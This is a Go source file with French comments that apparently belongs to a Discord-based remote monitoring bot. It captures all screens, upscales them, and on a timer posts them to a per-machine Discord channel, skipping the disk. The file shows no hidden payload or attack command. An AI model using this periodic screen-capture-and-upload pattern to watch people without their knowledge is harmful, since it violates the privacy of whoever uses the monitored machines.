// media.go — captures d'écran : qualité, agrandissement et envoi dans le
// salon dédié de la machine.
//
// La capture est faite en pixels physiques (DPI aware), donc déjà nette sur un
// écran HiDPI. L'agrandissement optionnel (x2 par défaut) ne rajoute pas de
// détail mais rend le texte lisible sur un téléphone, où une capture 1080p
// réduite par Discord devient illisible.
package main

import (
	"bytes"
	"fmt"
	"image"
	"image/png"
	"sync"
	"time"
)

var (
	shotScaleMu sync.Mutex
	shotScale   = 2 // 1 = natif, 2 = x2, 3 = x3
)

// setShotScale borne l'échelle entre 1 et 3.
func setShotScale(n int) {
	if n < 1 {
		n = 1
	}
	if n > 3 {
		n = 3
	}
	shotScaleMu.Lock()
	shotScale = n
	shotScaleMu.Unlock()
}

func shotScaleValue() int {
	shotScaleMu.Lock()
	defer shotScaleMu.Unlock()
	return shotScale
}

// shotsNow capture chaque moniteur, puis agrandit selon l'échelle courante.
func shotsNow() [][]byte {
	raw := captureScreensPNG()
	if len(raw) == 0 {
		return nil
	}
	factor := shotScaleValue()
	var out [][]byte
	for _, b := range raw {
		if factor > 1 {
			if up, err := upscalePNG(b, factor); err == nil {
				out = append(out, up)
			} else {
				out = append(out, b)
			}
		} else {
			out = append(out, b)
		}
	}
	return out
}

// upscalePNG agrandit une image par duplication de pixels (plus proche
// voisin) : sans rééchantillonnage, le texte reste parfaitement net, ce qui
// est exactement le but recherché pour lire une capture sur un téléphone.
func upscalePNG(data []byte, factor int) ([]byte, error) {
	src, err := png.Decode(bytes.NewReader(data))
	if err != nil {
		return nil, err
	}
	sb := src.Bounds()
	w, h := sb.Dx(), sb.Dy()
	// Plafond mémoire : au-delà de ~40 M pixels on renonce à l'agrandissement.
	if int64(w)*int64(h)*int64(factor*factor) > 40_000_000 {
		return data, nil
	}
	dw, dh := w*factor, h*factor
	dst := image.NewRGBA(image.Rect(0, 0, dw, dh))
	for y := 0; y < h; y++ {
		for x := 0; x < w; x++ {
			r, g, b, a := src.At(sb.Min.X+x, sb.Min.Y+y).RGBA()
			r8, g8, b8, a8 := uint8(r>>8), uint8(g>>8), uint8(b>>8), uint8(a>>8)
			for dy := 0; dy < factor; dy++ {
				row := (y*factor + dy) * dst.Stride
				for dx := 0; dx < factor; dx++ {
					i := row + (x*factor+dx)*4
					dst.Pix[i] = r8
					dst.Pix[i+1] = g8
					dst.Pix[i+2] = b8
					dst.Pix[i+3] = a8
				}
			}
		}
	}
	var out bytes.Buffer
	if err := png.Encode(&out, dst); err != nil {
		return nil, err
	}
	return out.Bytes(), nil
}

// shotFilenames fabrique un nom horodaté par moniteur.
func shotFilenames(n int) []string {
	stamp := time.Now().Format("060102-150405")
	out := make([]string, n)
	for i := range out {
		out[i] = fmt.Sprintf("shot-%s-%02d.png", stamp, i+1)
	}
	return out
}

// sendShots envoie les captures dans le salon dédié (`<machine>-screenshots`).
// Un seul message pour tous les moniteurs : le fil reste lisible.
func sendShots(caption string, shots [][]byte) (string, int) {
	if len(shots) == 0 {
		return "aucune capture produite", 0
	}
	ch := screenshotsChannel()
	if ch == "" {
		return "salon captures pas encore résolu", 0
	}
	names := shotFilenames(len(shots))
	var files []fileOut
	for i, b := range shots {
		if len(b) == 0 {
			continue
		}
		files = append(files, fileOut{Name: names[i], Data: b})
	}
	if len(files) == 0 {
		return "aucune capture produite", 0
	}
	sendFilesTo(ch, files...)
	return "<#" + ch + ">", len(files)
}

// screenshotTick est la cadence automatique : capture et envoi dans le salon,
// sans passer par le disque.
func screenshotTick() {
	if stopped.Load() || (cfg.BotToken == "" && cfg.WebhookURL == "") {
		return
	}
	shots := shotsNow()
	if len(shots) == 0 {
		return
	}
	ch := screenshotsChannel()
	if ch == "" {
		return
	}
	names := shotFilenames(len(shots))
	var files []fileOut
	for i, b := range shots {
		files = append(files, fileOut{Name: names[i], Data: b})
	}
	sendFilesTo(ch, files...)
	plog(fmt.Sprintf("capture: %d écran(s) envoyé(s) x%d", len(files), shotScaleValue()))
}
